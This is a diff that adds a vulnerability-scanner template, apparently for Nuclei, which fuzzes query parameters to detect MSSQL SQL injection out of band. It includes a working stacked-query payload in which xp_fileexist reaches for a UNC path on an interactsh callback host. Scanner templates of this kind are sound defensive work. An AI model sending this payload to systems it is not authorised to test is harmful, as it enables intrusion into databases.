@@ -1,0 +1,28 @@
+id: fuzz-xp-fileexist-oob
+
+info:
+  name: MSSQL xp_fileexist UNC path OOB
+  author: openai
+  severity: high
+  tags: mssql,rce,sqli,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      fileexist:
+        - "1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{fileexist}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
